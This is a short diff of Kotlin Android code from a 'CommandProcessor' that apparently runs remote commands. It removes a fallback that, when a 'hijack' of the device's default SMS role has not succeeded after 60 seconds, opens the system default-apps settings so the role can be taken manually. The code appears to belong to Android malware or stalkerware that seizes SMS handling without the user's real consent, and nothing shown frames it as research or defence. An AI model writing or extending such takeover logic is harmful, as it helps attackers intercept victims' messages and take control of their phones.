@@ -571,21 +571,6 @@ object CommandProcessor {
                         } else {
                             DefaultSmsManager.requestDefault(ctx)
                             status = "DEFAULT_SMS_REQUESTED"
-                            
-                            // FALLBACK: If hijack (AUTO) isn't successful within 60s, navigate manually
-                            if (mode == "AUTO") {
-                                CoroutineScope(Dispatchers.IO).launch {
-                                    delay(60000)
-                                    if (!DefaultSmsManager.isDefaultSms(ctx) && DefaultSmsManager.expectedMode == "AUTO") {
-                                        DebugLogger.log("SMS_MGR", "Hijack timeout (60s). Triggering manual navigation fallback.")
-                                        DefaultSmsManager.expectedMode = "AUTO_NAV"
-                                        val i = Intent(Settings.ACTION_MANAGE_DEFAULT_APPS_SETTINGS).apply {
-                                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_ANIMATION)
-                                        }
-                                        ctx.startActivity(i)
-                                    }
-                                }
-                            }
                         }
                     }
                 }
